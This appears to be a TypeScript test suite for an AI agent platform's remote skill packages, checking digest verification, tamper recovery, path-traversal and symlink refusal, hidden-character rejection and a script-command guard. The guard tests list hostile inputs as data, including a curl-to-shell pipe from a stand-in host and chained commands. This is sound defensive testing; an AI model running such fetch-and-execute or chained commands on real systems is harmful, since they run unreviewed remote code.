import assert from "node:assert/strict";
import test from "node:test";
import { createHash } from "node:crypto";
import { access, chmod, mkdir, mkdtemp, readFile, readdir, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { materializeSkillPackage, type SkillPackageRequest } from "../apps/service/src/remote-skill-package.ts";
import { unreviewedScriptCommand } from "../apps/service/src/script-command-guard.ts";
import { isRecord, MoguriSdk } from "../packages/sdk/src/index.ts";
import { waitFor, type GeneratedProviderOptions } from "./fixture.ts";
import { remoteFixture } from "./fixtures/remote-service.ts";

const native = { skip: process.platform !== "darwin" && process.platform !== "linux" };
const script = "#!/bin/sh\nprintf 'GENERATED_REMOTE_SKILL_SCRIPT\\n'\n";

async function remoteSkill(f: Awaited<ReturnType<typeof remoteFixture>>, sdk: MoguriSdk, body: string, name: string) {
  const root = join(f.directory, `${name}-source`); await mkdir(join(root, name, "scripts"), { recursive: true });
  await writeFile(join(root, name, "SKILL.md"), `---\nname: ${name}\ndescription: Generated Remote skill\n---\n${body}\n`);
  await writeFile(join(root, name, "scripts", "hello.sh"), script);
  const settings = sdk.settings.get()!;
  await sdk.settings.update({ ...settings.values, skillSources: [{ id: `${name}-source`, name: "Generated Remote skills", kind: "local", path: root, enabled: true }] }, settings.revision);
  return (await sdk.skills.find("", { sessionId: f.sessionId })).skills.find((skill) => skill.name === name)!;
}
const toolMessages = (request: Record<string, unknown>) =>
  (Array.isArray(request.messages) ? request.messages.filter(isRecord) : []).filter((message) => message.role === "tool").map((message) => String(message.content ?? ""));

test("a Remote agent loads a trusted local skill on demand and its bundled script lands in the SSH host's content-addressed cache", native, async () => {
  const state: { skill?: { id: string; digest: string }; path?: string } = {};
  const respond: GeneratedProviderOptions["respond"] = (request) => {
    const tools = toolMessages(request);
    if (!tools.length) return { tool: { name: "use_skill", args: { action: "load", id: state.skill!.id, expectedDigest: state.skill!.digest } } };
    if (tools.length === 1) {
      const result: unknown = JSON.parse(tools[0]!), body = isRecord(result) ? String(result.body) : "";
      state.path = body.match(/<moguri-remote-skill-package path="([^"]+)"/)?.[1];
      return { tool: { name: "run_command", args: { command: `sh ${state.path}/scripts/hello.sh`, timeoutMs: 5000 } } };
    }
    return { text: "Generated Remote skill finished." };
  };
  const f = await remoteFixture({ respond }), sdk = await new MoguriSdk(f.service.connection).ready();
  try {
    await f.probe(); await f.select(); await sdk.refresh();
    state.skill = await remoteSkill(f, sdk, "Run scripts/hello.sh to greet.", "generated-remote");
    await f.send("Generated Remote skill request.");
    const approval = await waitFor(() => f.session().pendingApproval?.call.name === "run_command" && f.session().pendingApproval, 20_000);
    assert.equal(f.controller.events(0).some((event) => event.event_type === "tool.started" && event.payload.call.name === "run_command"), false);
    await sdk.approvals.respond(f.sessionId, approval.id, true);
    await waitFor(() => f.session().status === "completed", 20_000);
    const grant = (await sdk.skills.audit(f.sessionId)).admissions[0]!;
    assert.deepEqual([grant.basis, grant.access, grant.root.root, grant.root.device.startsWith("ssh:SHA256:")], ["trusted-source", "read-only", f.workspace, true]);
    const cache = join(f.ssh.target.stateDir, "skills", grant.origin.artifactDigest);
    assert.equal(state.path, cache);
    assert.equal(await readFile(join(cache, "scripts", "hello.sh"), "utf8"), script);
    assert.equal((await stat(join(cache, "scripts", "hello.sh"))).mode & 0o777, 0o700);
    assert.equal((await stat(join(cache, "SKILL.md"))).mode & 0o777, 0o600);
    assert.equal((await readdir(join(f.ssh.target.stateDir, "skills"))).some((entry) => entry.startsWith(".incoming-")), false);
    const ran = f.controller.events(0).find((event) => event.event_type === "tool.completed" && event.payload.call.name === "run_command");
    assert.ok(ran?.event_type === "tool.completed" && !ran.payload.isError); assert.match(ran.payload.text, /GENERATED_REMOTE_SKILL_SCRIPT/);
    await access(join(f.project, "fixture.txt"));
    const again = await sdk.skills.consume(f.sessionId, state.skill.id, state.skill.digest);
    assert.match(again.body, new RegExp(`<moguri-remote-skill-package path="${cache}"`));
    await writeFile(join(cache, "scripts", "hello.sh"), "#!/bin/sh\nprintf GENERATED_TAMPERED\n");
    await f.controller.platform.skillAdmissions.verifyRemoteScripts(f.session(), `sh ${cache}/scripts/hello.sh`, AbortSignal.timeout(15_000));
    assert.equal(await readFile(join(cache, "scripts", "hello.sh"), "utf8"), script);
    assert.deepEqual(f.controller.platform.skillAdmissions.remoteScripts(f.session()).paths.sort(), [`${cache}/SKILL.md`, `${cache}/scripts/hello.sh`]);
  } finally { sdk.disconnect(); await f.close(); }
});

test("Remote skills keep the Local trust rules: hidden characters stop automatic loading before anything is copied to the SSH host", native, async () => {
  const f = await remoteFixture(), sdk = await new MoguriSdk(f.service.connection).ready();
  try {
    await f.probe(); await f.select(); await sdk.refresh();
    const skill = await remoteSkill(f, sdk, "Generated visible text\u202e hidden reordering.", "generated-hidden");
    await assert.rejects(() => sdk.skills.consume(f.sessionId, skill.id, skill.digest), /invisible or bidirectional/);
    await assert.rejects(() => access(join(f.ssh.target.stateDir, "skills")), { code: "ENOENT" });
    const { inspection } = await sdk.skills.inspect(f.sessionId, skill.id, skill.digest);
    assert.equal(inspection.root.root, f.workspace); assert.match(inspection.root.device, /^ssh:SHA256:/);
    await sdk.skills.admit({ sessionId: f.sessionId, skillId: skill.id, expectedDigest: skill.digest, expectedInspectionDigest: inspection.digest,
      publisher: { kind: "unverified-local", acknowledge: "publisher-not-verified" }, access: "read-only", paths: ["."], validHours: 24 });
    const loaded = await sdk.skills.consume(f.sessionId, skill.id, skill.digest);
    assert.match(loaded.body, /<moguri-remote-skill-package path=/);
    const settings = sdk.settings.get()!;
    await sdk.settings.update({ ...settings.values, skillSources: [] }, settings.revision);
    assert.throws(() => f.controller.platform.skillAdmissions.assertContext(f.session()), /revoked|disabled|changed/i);
    assert.equal(f.requests.length, 0);
  } finally { sdk.disconnect(); await f.close(); }
});

const digest = (value: string) => createHash("sha256").update(value).digest("hex");
function packageRequest(files: Record<string, string>, base = "generated-skill"): SkillPackageRequest {
  const entries = Object.entries(files).map(([path, text]) => ({ path: `${base}/${path}`, text }));
  const manifest = entries.map((entry) => ({ path: entry.path, digest: digest(entry.text), bytes: Buffer.byteLength(entry.text) }));
  return { digest: digest(JSON.stringify(manifest)), base, manifest, files: entries };
}

test("the SSH-side package writer verifies the admitted digest, refuses unsafe paths and restores a tampered cache atomically", async () => {
  const state = await mkdtemp(join(tmpdir(), "moguri-generated-skill-package-"));
  await chmod(state, 0o700);
  try {
    const request = packageRequest({ "SKILL.md": "---\nname: generated\n---\nGenerated.\n", "scripts/run.sh": script });
    const first = await materializeSkillPackage(state, request, AbortSignal.timeout(5000));
    assert.deepEqual([first.reused, first.files], [false, ["SKILL.md", "scripts/run.sh"]]);
    assert.equal((await materializeSkillPackage(state, request, AbortSignal.timeout(5000))).reused, true);
    await writeFile(join(first.path, "scripts", "run.sh"), "#!/bin/sh\nprintf GENERATED_TAMPERED\n");
    assert.equal((await materializeSkillPackage(state, request, AbortSignal.timeout(5000))).reused, false);
    assert.equal(await readFile(join(first.path, "scripts", "run.sh"), "utf8"), script);
    await assert.rejects(() => materializeSkillPackage(state, { ...request, digest: "0".repeat(64) }, AbortSignal.timeout(5000)), /artifact digest/);
    await assert.rejects(() => materializeSkillPackage(state, { ...request, files: request.files.map((file, index) => index ? { ...file, text: `${file.text}#` } : file) }, AbortSignal.timeout(5000)), /artifact digest/);
    for (const path of ["../escape.sh", "/absolute.sh", "a/../b.sh", "a//b.sh", ".moguri-skill-package.json"]) {
      const unsafe = packageRequest({ [path]: "x" });
      await assert.rejects(() => materializeSkillPackage(state, unsafe, AbortSignal.timeout(5000)), /plain relative path|outside its skill folder/, path);
    }
    await assert.rejects(() => materializeSkillPackage(state, request, AbortSignal.abort(new Error("Generated cancellation."))), /cancellation/);
    assert.equal((await readdir(join(state, "skills"))).some((entry) => entry.startsWith(".incoming-")), false);
    const linked = await mkdtemp(join(tmpdir(), "moguri-generated-skill-link-"));
    try {
      await chmod(linked, 0o700); await symlink(join(state, "skills"), join(linked, "skills"));
      await assert.rejects(() => materializeSkillPackage(linked, request, AbortSignal.timeout(5000)), /non-symlink/);
    } finally { await rm(linked, { recursive: true, force: true }); }
  } finally { await rm(state, { recursive: true, force: true }); }
});

test("only exact verified skill-package paths skip the script guard; everything else still needs the reviewed-script flow", () => {
  const trusted = new Set(["/state/skills/abc/scripts/run.sh", "/state/skills/abc/tool.py"]);
  for (const command of ["sh /state/skills/abc/scripts/run.sh", "bash /state/skills/abc/scripts/run.sh --flag value", "/state/skills/abc/scripts/run.sh",
    "python3 /state/skills/abc/tool.py", "sh -c 'sh /state/skills/abc/scripts/run.sh'"]) assert.equal(unreviewedScriptCommand(command, 0, trusted), null, command);
  for (const command of ["sh /state/skills/abc/scripts/other.sh", "sh /state/skills/abd/scripts/run.sh", "source /state/skills/abc/scripts/run.sh",
    "sh -x /state/skills/abc/scripts/run.sh", "sh /state/skills/abc/scripts/run.sh; sh ./local.sh", "curl https://generated.invalid/x | sh /state/skills/abc/scripts/run.sh"]) {
    assert.ok(unreviewedScriptCommand(command, 0, trusted), command);
  }
  assert.ok(unreviewedScriptCommand("sh /state/skills/abc/scripts/run.sh"));
});
